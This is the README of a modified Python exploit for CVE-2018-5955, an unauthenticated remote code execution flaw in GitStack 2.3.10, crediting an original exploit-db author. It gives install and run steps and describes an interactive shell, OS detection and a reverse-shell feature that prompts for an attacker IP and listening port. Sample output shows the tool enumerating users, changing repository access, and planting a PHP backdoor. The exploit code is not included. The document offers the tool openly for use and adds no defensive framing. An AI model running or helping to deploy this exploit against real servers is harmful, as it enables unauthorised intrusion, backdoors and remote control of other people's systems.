# CVE-2018-5955
An exploit for CVE-2018-5955 GitStack 2.3.10 Unauthenticated RCE

Exploit: GitStack 2.3.10 Unauthenticated Remote Code Execution

Date: 18.01.2018

Software Link: https://gitstack.com/

Exploit Author: Kacper Szurek

Original Exploit: https://www.exploit-db.com/exploits/43777

Website: https://security.szurek.pl/

Category: remote

CVE: CVE-2018-5955

# Exploit Modified by MikeTheHash

 Date: 23.06.2023
 
 New features: Interactive RCE, OS Detect, Reverse Shell function, adapted from python2 to python3
 
CVE: CVE-2018-5955

Category: remote

## How to use
Install requirements:

    pip install colorama

Then, you can run it with:

    python3 exploit.py

## Functions
  - OS Detection
  - Reverse shell

  #### OS Detection: 
  The OS will be detected after you have exploited the CVE, in fact there will be this line of output: "[*] OS: $operatingsystem" (Dimostration below)
  
    [+] Get user list
    [+] Found user twreath
    [+] Web repository already enabled
    [+] Get repositories list
    [+] Found repository Website
    [+] Add user to repository
    [+] Disable access for anyone
    [+] Create backdoor in PHP
    [*] Type 'shell' to get a reverse shell
    [*] OS : Windows <----

  You can also type "os" to find out what type of Operating system is
  
  #### Reverse shell
  To get an actual reverse shell on the target you can type "shell" and then type your IP and your listen port like this:
  
    RCE > shell
    [?] Please enter the IP address for the shell: YOUR IP HERE
    [?] Please enter the port number for the shell: YOUR LISTEN PORT HERE

# Happy hacking!
